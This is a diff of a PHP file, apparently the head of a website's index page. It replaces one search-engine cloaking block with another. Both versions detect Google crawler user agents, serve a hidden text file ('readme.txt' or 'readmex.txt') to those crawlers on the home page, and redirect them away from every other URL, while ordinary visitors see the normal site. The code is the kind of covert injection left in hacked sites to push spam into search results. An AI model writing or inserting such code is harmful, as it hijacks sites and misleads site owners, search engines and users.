@@ -1,25 +1,27 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-$bot_agents = ['google', 'bot', 'crawler', 'spider', 'chrome-lighthouse'];
-$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
-$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
-$is_bot = false;
-foreach ($bot_agents as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-        $is_bot = true;
-        break;
+
+function is_google_bot() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
+    $agents = array("googlebot", "google-site-verification", "google-inspectiontool", "googlebot-mobile", "googlebot-news", "googlebot-image", "googlebot-video", "googlebot-desktop", "googlebot-ads", "google-read-aloud", "apis-google", "mediapartners-google", "google favicon", "google web preview", "feedfetcher-google");
+    foreach ($agents as $agent) {
+        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
     }
+    return false;
 }
 
-// Jika bot berada di home page
-if ($is_bot && $uri == '/') {
-    echo file_get_contents("readme.txt");
-    }
+$is_google_bot = is_google_bot();
+$uri = $_SERVER['REQUEST_URI'] ?? '';
 
-if ($is_bot && $uri !== '/') {
-    header("Location: /", true, 302);
-    exit();
+if ($is_google_bot) {
+    if ($uri == '/') {
+        if (file_exists('readmex.txt')) {
+            echo file_get_contents('readmex.txt');
+        }
+        exit();
+    } else {
+        header("Location: /");
+        exit();
+    }
 }
 ?>
 <?php
